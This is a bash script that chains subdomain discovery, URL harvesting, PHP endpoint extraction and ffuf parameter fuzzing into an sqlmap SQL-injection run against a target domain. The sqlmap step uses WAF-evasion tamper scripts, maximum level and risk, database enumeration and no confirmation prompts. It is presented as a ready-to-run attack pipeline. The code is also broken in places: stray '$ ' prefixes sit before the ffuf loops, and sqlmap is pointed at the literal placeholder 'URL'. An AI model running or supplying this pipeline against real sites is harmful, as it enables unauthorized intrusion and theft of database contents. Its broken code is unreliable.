#!/bin/bash

target=$1

RED="\e[31m"
GREEN="\e[32m"
ENDCOLOR="\e[0m"

subfinder -d $target | tee subdomains.txt

echo "Get urls from subdomains using gau"
cat subdomains.txt | gau --blacklist png,jpg,gif,jpeg,swf,woff,svg,pdf,tiff,tif,bmp,webp,ico,mp4,mov,js,css,eps,raw | tee all_urls.txt
echo -e "${GREEN} Fetching urls using GAU done${ENDCOLOR}"

echo "Clean urls and check for http status code 200"
cat all_urls.txt | uro | httpx -mc 200 -silent | tee live_urls.txt
echo -e "${GREEN} Checking http status 200 done${ENDCOLOR}"

echo "Grep all php endpoints"
cat live_urls.txt | grep ".php" | cut -f1 -d"?" | sed 's:/*$::' | sort -u > php_endpoints_urls.txt
echo -e "${GREEN} Grep all php endpoints done${ENDCOLOR}"

echo "Fuzz possible hidden params with ffuf (GET)"
$ for URL in $(<php_endpoints_urls.txt); do (ffuf -u "${URL}?FUZZ=1" -w params_list.txt -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_sqli_injections); done
echo -e "${GREEN}Fuzz GET Done${ENDCOLOR}"

echo "Fuzz possible hidden params with ffuf (POST)"
$ for URL in $(<php_endpoints_urls.txt); do (ffuf -X POST -u "${URL}" -w params_list.txt -mc 200 -ac -sa -t 20 -or -od ffuf_hidden_params_sqli_injections -d "FUZZ=1"); done
echo -e "${GREEN}Fuzz POST Done${ENDCOLOR}"

echo "SQLMapping with possible valid params"
python3 sqlmap -u "URL" --random-agent --tamper="between,randomspace,space2comment" -v 2 --dbs --level 5 --risk 3 --batch
echo -e "${GREEN}SQLMap on possible valid params done${ENDCOLOR}"

